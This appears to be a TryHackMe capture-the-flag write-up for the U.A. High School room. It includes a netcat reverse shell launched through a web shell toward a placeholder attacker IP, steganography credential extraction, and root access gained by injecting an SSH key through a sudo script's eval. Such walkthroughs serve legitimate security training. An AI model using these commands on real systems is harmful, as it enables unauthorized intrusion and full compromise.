---
tags:
  - THM
  - Linux
  - Easy
  - RCE
  - Leakage
  - Stego
  - Sudo
---
https://tryhackme.com/room/yueiua/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.182.154 uahs.thm
```
# Scanning
```console
$ nmap -p22,80 -sV -sC uahs.thm

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 58:2f:ec:23:ba:a9:fe:81:8a:8e:2d:d8:91:21:d2:76 (RSA)
|   256 9d:f2:63:fd:7c:f3:24:62:47:8a:fb:08:b2:29:e2:b4 (ECDSA)
|_  256 62:d8:f8:c9:60:0f:70:1f:6e:11:ab:a0:33:79:b5:5d (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: U.A. High School
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
Discovered `/assets/index.php` file, which happens to be a reverse shell:
```console
$ gobuster dir -q -b 403,404 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://uahs.thm/
/assets               (Status: 301) [Size: 305] [--> http://uahs.thm/assets/]
/index.html           (Status: 200) [Size: 1988]

$ gobuster dir -q -b 403,404 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://uahs.thm/assets/
/images               (Status: 301) [Size: 312] [--> http://uahs.thm/assets/images/]
/index.php            (Status: 200) [Size: 0]
```
# Exploitation
Wait for connections:
```bash
nc -lvnp <PORT>
```
Establish reverse shell connection:
```console
$ ip='<ATTACKER-IP>'

$ port='<PORT>'

$ curl -s "http://uahs.thm/assets/index.php?cmd=busybox+nc+$ip+$port+-e+sh"
```
# Post-Exploitation
## Steganography
Found **user deku**:
```console
$ grep sh$ /etc/passwd

root:x:0:0:root:/root:/bin/bash
deku:x:1000:1000:deku:/home/deku:/bin/bash
```
Found a base64-encoded **passphrase** in a hidden directory:
```console
$ cat /var/www/Hidden_Content/passphrase.txt
QWxsbWlnaHRGb3JFdmVyISEhCg==

$ base64 -d /var/www/Hidden_Content/passphrase.txt
AllmightForEver!!!
```
Move the images from `/var/www/html/assets/images` to the local machine. The **JPEG image** `oneforall.jpg` seems to be broken, so check file signature:
```console
$ xxd oneforall.jpg | head

00000000: 8950 4e47 0d0a 1a0a 0000 0001 0100 0001  .PNG............
00000010: 0001 0000 ffdb 0043 0006 0405 0605 0406  .......C........
00000020: 0605 0607 0706 080a 100a 0a09 090a 140e  ................
00000030: 0f0c 1017 1418 1817 1416 161a 1d25 1f1a  .............%..
00000040: 1b23 1c16 1620 2c20 2326 2729 2a29 191f  .#... , #&')*)..
00000050: 2d30 2d28 3025 2829 28ff db00 4301 0707  -0-(0%()(...C...
00000060: 070a 080a 130a 0a13 281a 161a 2828 2828  ........(...((((
00000070: 2828 2828 2828 2828 2828 2828 2828 2828  ((((((((((((((((
00000080: 2828 2828 2828 2828 2828 2828 2828 2828  ((((((((((((((((
00000090: 2828 2828 2828 2828 2828 2828 2828 ffc0  ((((((((((((((..
xxd: Broken pipe
```
Repair the **image** `oneforall.jpg` by modifying it to begin with the **JPEG** magic numbers `FF D8 FF E0 00 10 4A 46 49 46 00 01`:
```console
$ hexedit oneforall.jpg

^X
```
Found **password** for **user deku** in hidden data using `steghide`:
```console
$ steghide extract -sf oneforall.jpg
Enter passphrase: AllmightForEver!!!
wrote extracted data to "creds.txt".

$ cat creds.txt
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:One?For?All_!!one1/A
```
## Privilege Escalation
Connect as **user deku** via SSH:
```bash
sshpass -p 'One?For?All_!!one1/A' ssh deku@uahs.thm
```
Read the **user flag**:
```bash
cat /home/deku/user.txt
```
We can run **script** `/opt/NewComponent/feedback.sh` with **sudo privileges**:
```console
$ sudo -l

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
```
The **script** logs user feedbacks, but using the insecure `eval` function.
`cat /opt/NewComponent/feedback.sh`:
```bash
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi
```
The characters `` ` ``, `)`, `$(`, `|`, `&`, `;`, `?`, `!` and `\` are blocked, but we can still write content to files using `>`. So, we generate a new **SSH key** in the attacker's machine:
```bash
ssh-keygen -t rsa -f ./school_key
```
Copy the new generated **SSH public key** to `/root/.ssh/authorized_keys` by abusing the `eval` function inside the **sudo script**:
```console
$ sudo /opt/NewComponent/feedback.sh

Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
"<YOUR-PUB-FILE-HERE>" > /root/.ssh/authorized_keys
It is This:
Feedback successfully saved.
```
Connect via SSH as **user root**:
```bash
ssh -i school_key root@uahs.thm
```
Read the **root flag**:
```bash
cat /root/root.txt
```